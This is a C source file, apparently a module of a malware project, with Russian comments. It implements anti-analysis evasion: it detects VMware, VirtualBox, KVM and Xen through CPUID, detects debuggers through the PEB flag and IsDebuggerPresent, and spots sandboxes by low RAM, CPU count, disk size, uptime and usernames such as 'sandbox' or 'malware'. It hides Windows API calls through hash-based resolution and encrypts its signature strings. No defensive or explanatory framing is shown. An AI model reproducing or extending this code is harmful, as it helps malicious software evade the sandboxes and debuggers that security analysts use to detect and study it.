// src/antianalysis/antianalysis.c
// Anti-VM / Anti-Debug / Anti-Sandbox.

#include "antianalysis.h"
#include "../loader/api_resolver.h"
#include "../common/hashes.h"
#include "../common/memory.h"
#include "strings.h"

// Логирование отключено
static void log_anti(const char* msg) { (void)msg; }
#define ALOG(msg) log_anti(msg "\n")

// ------------------------------------------------------------
// CPUID
// ------------------------------------------------------------
void cpu_id(u32 leaf, u32 subleaf, cpuid_result_t* out) {
    if (!out) return;
    u32 a, b, c, d;
    __asm__ __volatile__ (
        "cpuid"
        : "=a"(a), "=b"(b), "=c"(c), "=d"(d)
        : "a"(leaf), "c"(subleaf)
    );
    out->eax = a; out->ebx = b; out->ecx = c; out->edx = d;
}

// ------------------------------------------------------------
// Anti-VM: CPUID vendor string
// ------------------------------------------------------------
static BOOL_ check_cpuid_vendor(void) {
    cpuid_result_t r;
    cpu_id(0x40000000, 0, &r);

    char vendor[13];
    *(u32*)&vendor[0] = r.ebx;
    *(u32*)&vendor[4] = r.ecx;
    *(u32*)&vendor[8] = r.edx;
    vendor[12] = 0;

    char vmw[16], vbox[16], kvm[16], xen[16];
    decrypt_string(vmw,  ENC_VMWARE, ENC_VMWARE_SIZE, ENC_VMWARE_KEY);
    decrypt_string(vbox, ENC_VBOX,   ENC_VBOX_SIZE,   ENC_VBOX_KEY);
    decrypt_string(kvm,  ENC_KVM,    ENC_KVM_SIZE,    ENC_KVM_KEY);
    decrypt_string(xen,  ENC_XEN,    ENC_XEN_SIZE,    ENC_XEN_KEY);

    const char* sigs[] = { vmw, vbox, kvm, xen, NULL_ };

    for (int i = 0; sigs[i]; i++) {
        int match = 1;
        for (int j = 0; sigs[i][j]; j++) {
            if (vendor[j] != sigs[i][j]) { match = 0; break; }
        }
        if (match) return TRUE_;
    }
    return FALSE_;
}

// ------------------------------------------------------------
// Anti-Debug
// ------------------------------------------------------------
static BOOL_ check_peb_debugged(void) {
    void* peb = get_peb();
    if (!peb) return FALSE_;
    PEB_* p = (PEB_*)peb;
    return p->BeingDebugged ? TRUE_ : FALSE_;
}

static BOOL_ check_is_debugger_present(void) {
    typedef int (__stdcall *pIsDebuggerPresent)(void);
    pIsDebuggerPresent fn = (pIsDebuggerPresent)
        resolve_kernel32(H_IsDebuggerPresent);
    if (!fn) return FALSE_;
    return fn() ? TRUE_ : FALSE_;
}

// ------------------------------------------------------------
// Anti-Sandbox
// ------------------------------------------------------------
static BOOL_ check_low_ram(void) {
    typedef int (__stdcall *pGlobalMemoryStatusEx)(void*);
    pGlobalMemoryStatusEx fn = (pGlobalMemoryStatusEx)
        resolve_kernel32(H_GlobalMemoryStatusEx);
    if (!fn) return FALSE_;

    struct {
        u32 dwLength, dwMemoryLoad;
        u64 ullTotalPhys, ullAvailPhys;
        u64 ullTotalPageFile, ullAvailPageFile;
        u64 ullTotalVirtual, ullAvailVirtual, ullAvailExtendedVirtual;
    } mem;

    bs_memset(&mem, 0, sizeof(mem));
    mem.dwLength = sizeof(mem);
    if (!fn(&mem)) return FALSE_;

    u64 a = 2, b = 1024, c = 1024, d = 1024;
    u64 threshold = a * b * c * d;
    return (mem.ullTotalPhys < threshold) ? TRUE_ : FALSE_;
}

static BOOL_ check_low_cpu(void) {
    typedef void (__stdcall *pGetSystemInfo)(void*);
    pGetSystemInfo fn = (pGetSystemInfo)resolve_kernel32(H_GetSystemInfo);
    if (!fn) return FALSE_;

    struct {
        u16 wProcessorArchitecture, wReserved;
        u32 dwPageSize;
        void *lpMinimumApplicationAddress, *lpMaximumApplicationAddress;
        u64 dwActiveProcessorMask;
        u32 dwNumberOfProcessors, dwProcessorType, dwAllocationGranularity;
        u16 wProcessorLevel, wProcessorRevision;
    } si;

    bs_memset(&si, 0, sizeof(si));
    fn(&si);

    u32 threshold = 1 + 1;
    return (si.dwNumberOfProcessors < threshold) ? TRUE_ : FALSE_;
}

static BOOL_ check_username(void) {
    typedef int (__stdcall *pGetUserNameA)(char*, u32*);
    pGetUserNameA fn = (pGetUserNameA)resolve_kernel32(H_GetUserNameA);
    if (!fn) return FALSE_;

    char user[256];
    u32 size = sizeof(user);
    if (!fn(user, &size)) return FALSE_;

    char wdag[32], sandbox[16], malware[16], virus[16];
    decrypt_string(wdag,    ENC_WDAG,    ENC_WDAG_SIZE,    ENC_WDAG_KEY);
    decrypt_string(sandbox, ENC_SANDBOX, ENC_SANDBOX_SIZE, ENC_SANDBOX_KEY);
    decrypt_string(malware, ENC_MALWARE, ENC_MALWARE_SIZE, ENC_MALWARE_KEY);
    decrypt_string(virus,   ENC_VIRUS,   ENC_VIRUS_SIZE,   ENC_VIRUS_KEY);

    const char* bad_names[] = { wdag, sandbox, malware, virus, NULL_ };

    for (int i = 0; bad_names[i]; i++) {
        const char* a = user; const char* b = bad_names[i];
        while (*a && *b) {
            char ca = *a, cb = *b;
            if (ca >= 'A' && ca <= 'Z') ca += 32;
            if (cb >= 'A' && cb <= 'Z') cb += 32;
            if (ca != cb) break;
            a++; b++;
        }
        if (*a == 0 && *b == 0) return TRUE_;
    }
    return FALSE_;
}

static BOOL_ check_low_uptime(void) {
    typedef u64 (__stdcall *pGetTickCount64)(void);
    pGetTickCount64 fn = (pGetTickCount64)resolve_kernel32(H_GetTickCount64);
    if (!fn) return FALSE_;

    u64 ms = fn();
    u64 m = 10, s = 60, k = 1000;
    u64 threshold = m * s * k;
    return (ms < threshold) ? TRUE_ : FALSE_;
}

static BOOL_ check_low_disk(void) {
    typedef int (__stdcall *pGetDiskFreeSpaceExA)(const char*, u64*, u64*, u64*);
    pGetDiskFreeSpaceExA fn = (pGetDiskFreeSpaceExA)
        resolve_kernel32(H_GetDiskFreeSpaceExA);
    if (!fn) return FALSE_;

    u64 free_bytes = 0, total_bytes = 0, total_free = 0;
    if (!fn("C:\\", &free_bytes, &total_bytes, &total_free)) return FALSE_;

    u64 a = 60, b = 1024, c = 1024, d = 1024;
    u64 threshold = a * b * c * d;
    return (total_bytes < threshold) ? TRUE_ : FALSE_;
}

// ------------------------------------------------------------
// Публичные проверки
// ------------------------------------------------------------
BOOL_ is_debugger_present(void) {
    BOOL_ a = check_peb_debugged();
    BOOL_ b = check_is_debugger_present();
    return (a || b) ? TRUE_ : FALSE_;
}

BOOL_ is_vm(void) {
    return check_cpuid_vendor();
}

BOOL_ is_sandbox(void) {
    BOOL_ a = check_low_ram();
    BOOL_ b = check_low_cpu();
    BOOL_ c = check_username();
    BOOL_ d = check_low_uptime();
    BOOL_ e = check_low_disk();
    return (a || b || c || d || e) ? TRUE_ : FALSE_;
}

BOOL_ anti_analysis_check(void) {
    if (is_debugger_present()) return TRUE_;
    if (is_vm()) return TRUE_;
    if (is_sandbox()) return TRUE_;
    return FALSE_;
}